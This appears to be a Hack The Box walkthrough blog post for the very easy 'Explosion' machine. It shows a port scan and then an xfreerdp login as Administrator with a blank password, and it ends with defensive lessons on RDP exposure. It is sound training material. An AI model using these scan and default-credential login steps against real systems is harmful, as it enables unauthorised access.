---
title: "Explosion — Hack The Box Walkthrough"
description: "Rooting Explosion through a default blank RDP password on Windows."
date: 2026-09-01
category: offensive
readTime: "2 min read"
mitre:
  - "T1078"
tags:
  - "Hack The Box"
  - "RDP"
  - "Default Credentials"
  - "Windows"
  - "CTF"
summary: "Rooting Explosion through a default blank RDP password on Windows."
---

**Machine:** Explosion
**Difficulty:** Very Easy
**Key Techniques:** RDP default credentials, blank Administrator password

---

## Enumeration

### Port Scanning

```bash
rustscan -a 10.129.70.201 -- -sVC
```

Open ports discovered:

| Port | Service | Version |
|------|---------|---------|
| 135 | msrpc | Microsoft Windows RPC |
| 139 | netbios-ssn | Microsoft Windows netbios-ssn |
| 445 | microsoft-ds | — |
| 3389 | ms-wbt-server | Microsoft Terminal Services |
| 5985 | http | Microsoft HTTPAPI httpd 2.0 |
| 47001 | http | Microsoft HTTPAPI httpd 2.0 |

The SSL certificate on port 3389 identifies the host as **Explosion**. The `rdp-ntlm-info` script confirms hostname `EXPLOSION` running Windows Server 2019 (10.0.17763).

---

## Exploitation

### RDP Default Credentials

The attack surface is port 3389 — RDP. The most common first step is trying default credentials.

```bash
xfreerdp /v:10.129.70.201 /u:Administrator /p: /cert:ignore
```

The Administrator account has a **blank password**. The session opens immediately — full desktop access.

### User Flag

The desktop contains `flag.txt`:

```
user.txt: <flag>
```

---

## Lessons Learned

1. **Blank passwords are a critical vulnerability.** The first thing any attacker tries is default or blank credentials for admin accounts.
2. **RDP should never be exposed directly** without NLA (Network Level Authentication) or VPN-only access.
3. **Account lockout policies and login monitoring** would detect brute-force attempts on RDP.
